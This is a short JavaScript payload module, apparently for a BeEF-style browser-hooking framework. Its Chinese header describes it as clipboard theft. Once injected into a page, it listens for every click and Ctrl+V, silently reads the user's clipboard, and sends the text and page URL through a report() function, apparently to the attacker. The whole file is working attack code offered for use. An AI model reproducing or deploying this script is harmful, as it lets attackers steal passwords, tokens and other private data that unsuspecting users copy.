// MODULE = {"desc": "剪贴板窃取:用户点击/粘贴后读取剪贴板内容回传(BeEF clipboard_theft)", "category": "劫持", "params": []}
(function () {
  function steal() {
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function (t) {
          if (t) { report({ type: "clipboard", url: location.href, text: String(t).slice(0, 1000) }); }
        }).catch(function () {});
        return;
      }
      if (window.clipboardData) {
        var text = window.clipboardData.getData('Text') || '';
        if (text) { report({ type: "clipboard", url: location.href, text: String(text).slice(0, 1000) }); }
      }
    } catch (e) {}
  }
  document.addEventListener('click', function () { setTimeout(steal, 200); });
  document.addEventListener('keydown', function (e) {
    if (e.ctrlKey && (e.key === 'v' || e.key === 'V')) { setTimeout(steal, 300); }
  });
})();
